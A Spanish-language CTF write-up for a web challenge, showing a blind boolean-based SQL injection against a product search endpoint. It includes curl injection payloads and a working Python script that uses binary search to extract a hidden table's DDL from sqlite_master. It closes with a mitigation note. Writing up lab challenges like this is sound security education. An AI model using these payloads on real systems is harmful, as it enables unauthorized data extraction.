# Pulpería Doña Ana

| | |
|---|---|
| **Categoría** | Web |
| **Dificultad** | Media |
| **Puntos** | 200 |
| **Reto #** | 05 |
| **Instancia** | `http://chals.tropicalhunters.com:9012` |

## Descripción

La pulpería de Doña Ana tiene un buscador de productos. La pista menciona que digitalizó su cuaderno de fiados, pero ninguna página lo muestra. La flag no está en ninguna fila del cuaderno, sino en su definición (`CREATE TABLE`).

## Vulnerabilidad

**SQL Injection — Blind Boolean-based (CWE-89)**

El endpoint `GET /api/productos/buscar?q=` concatena el parámetro directamente en la query:

```sql
SELECT * FROM productos WHERE nombre LIKE '%[q]%' AND eliminado = 0
```

`UNION` estaba bloqueado (HTTP 500), pero la inyección booleana funcionó sin comentarios.

## Solución

### 1. Confirmar la inyección

```bash
# TRUE: devuelve todos los productos (19)
curl -G --data-urlencode "q=' OR '1'='1" \
  http://chals.tropicalhunters.com:9012/api/productos/buscar

# FALSE: devuelve 0 resultados
curl -G --data-urlencode "q=' AND '1'='2" \
  http://chals.tropicalhunters.com:9012/api/productos/buscar
```

### 2. Oracle booleano con `ZZZZ`

Usar un término que nunca coincide en productos para que el resultado dependa solo de la condición inyectada:

```
q = ZZZZ' OR (CONDICION)>0 OR '1'='ZZZZ
```

- `TRUE` → 19 productos
- `FALSE` → 0 productos

### 3. Descubrir la tabla oculta

```python
# ¿Existe tabla con "fiado" en el nombre?
cond = "SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE '%fiado%'"
# → TRUE  →  tabla: cuaderno_de_fiados
```

### 4. Localizar la flag en el DDL

```python
# ¿El sql de CREATE TABLE contiene TH{?
cond = "SELECT COUNT(*) FROM sqlite_master WHERE tbl_name='cuaderno_de_fiados' AND sql LIKE '%TH{%'"
# → TRUE  →  la flag está en un comentario SQL del DDL
```

### 5. Extraer la flag (búsqueda binaria por ASCII)

```python
#!/usr/bin/env python3
import requests

BASE  = "http://chals.tropicalhunters.com:9012/api/productos/buscar"
TABLE = "cuaderno_de_fiados"

def check(condition):
    payload = f"ZZZZ' OR ({condition})>0 OR '1'='ZZZZ"
    r = requests.get(BASE, params={"q": payload})
    return len(r.json().get("data", [])) > 0

def get_char(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (f"SELECT CASE WHEN UNICODE(SUBSTR(sql,{pos},1))>{mid} "
                f"THEN 1 ELSE 0 END FROM sqlite_master WHERE tbl_name='{TABLE}'")
        if check(cond): lo = mid + 1
        else: hi = mid
    return chr(lo)

# La flag empieza en la posición 162 del DDL (largo total: 194)
flag = "".join(get_char(i) for i in range(162, 192))
print(flag)
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- Blind boolean SQLi funciona con solo dos estados (0 filas / N filas) y búsqueda binaria: ~7 requests por carácter.
- Los metadatos de SQLite (`sqlite_master.sql`) contienen el DDL completo, incluidos comentarios.
- Bloquear `UNION` no impide la inyección booleana.
- Mitigación: usar consultas parametrizadas (`?`); nunca concatenar input del usuario en SQL.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
